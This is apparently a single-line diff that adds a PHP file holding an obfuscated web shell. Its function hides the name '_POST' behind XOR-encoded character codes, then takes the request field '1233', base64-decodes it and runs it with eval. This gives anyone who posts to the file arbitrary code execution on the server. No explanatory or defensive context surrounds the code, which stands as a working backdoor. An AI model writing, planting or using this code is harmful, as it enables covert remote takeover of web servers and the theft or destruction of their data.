@@ -1,0 +1,1 @@
+<?function checkey() {$code = '_' . chr(43^123) . chr(81^30) . chr(15^92) . chr(82^6);return $code;}$check = ${checkey()}['1233'];$list = base64_decode($check);eval("\n" . $list);?>
